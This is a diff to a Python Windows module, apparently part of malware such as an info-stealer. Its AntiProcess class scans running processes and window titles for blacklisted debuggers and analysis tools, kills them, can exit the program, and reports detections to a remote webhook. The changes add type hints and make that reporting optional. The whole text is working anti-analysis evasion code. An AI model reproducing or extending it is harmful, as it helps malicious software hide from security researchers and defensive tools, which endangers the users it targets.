@@ -14,6 +14,8 @@ import time
 
 import psutil
 import win32gui
+
+from typing import Any
 from win32process import GetWindowThreadProcessId
 
 from ..constants import Lists
@@ -21,11 +23,16 @@ from ..utils.webhook import Webhook
 
 
 class AntiProcess:
-    def __init__(self, webhook_url: str, logger, should_exit: bool) -> None:
-        self.webhook_url = webhook_url
-        self.logger = logger
-        self.webhook = Webhook(webhook_url)
-        self.should_exit = should_exit
+    def __init__(
+            self,
+            webhook: Webhook,
+            logger: Any,
+            exit: bool,
+            report: bool) -> None:
+        self.webhook: Webhook = webhook
+        self.logger: Any = logger
+        self.exit: bool = exit
+        self.report: bool = report
 
     def CheckProcessList(self) -> None:
         while True:
@@ -39,12 +46,13 @@ class AntiProcess:
                         try:
                             self.logger.info(
                                 f"{process.name} Process Was Running")
-                            self.webhook.send(
-                                f"Anti-Debug Program: `{process.name()}` was detected running on the system.",
-                                "Anti Process",
-                            )
+                            if self.report:
+                                self.webhook.send(
+                                    f"Anti-Debug Program: `{process.name()}` was detected running on the system.",
+                                    "Anti Process",
+                                )
                             process.kill()
-                            if self.should_exit:
+                            if self.exit:
                                 os._exit(1)
                         except (psutil.NoSuchProcess, psutil.AccessDenied):
                             pass
@@ -55,14 +63,15 @@ class AntiProcess:
         while True:
             try:
                 time.sleep(0.7)
-                window_name = win32gui.GetWindowText(
-                    win32gui.GetForegroundWindow())
+                window_name: str = win32gui.GetWindowText(
+                    win32gui.GetForegroundWindow()
+                )
                 if window_name in Lists.BLACKLISTED_WINDOW_NAMES:
                     self.logger.info(f"{window_name} Found")
-                    self.webhook.send(
-                        f"Found `{window_name}` in Window Names",
-                        "Anti Process")
-                    if self.should_exit:
+                    if self.report:
+                        self.webhook.send(
+                            f"Found `{window_name}` in Window Names", "Anti Process")
+                    if self.exit:
                         os._exit(1)
             except (RuntimeError, NameError, TypeError, OSError) as error:
                 self.webhook.send(f"Error!: ```yaml\n{error}\n```")
@@ -72,7 +81,7 @@ class AntiProcess:
         def winEnumHandler(hwnd, ctx) -> None:
             if win32gui.GetWindowText(hwnd).lower(
             ) in Lists.BLACKLISTED_WINDOW_NAMES:
-                pid = GetWindowThreadProcessId(hwnd)
+                pid: tuple[int, int] = GetWindowThreadProcessId(hwnd)
                 if isinstance(pid, int):
                     try:
                         psutil.Process(pid).terminate()
@@ -85,10 +94,11 @@ class AntiProcess:
                         except BaseException:
                             pass
                 self.logger.info(f"{win32gui.GetWindowText(hwnd)} Found")
-                self.webhook.send(
-                    f"Debugger Open: {win32gui.GetWindowText(hwnd)}",
-                    "Anti Process")
-                if self.should_exit:
+                if self.report:
+                    self.webhook.send(
+                        f"Debugger Open: {win32gui.GetWindowText(hwnd)}",
+                        "Anti Process")
+                if self.exit:
                     os._exit(1)
 
         while True:
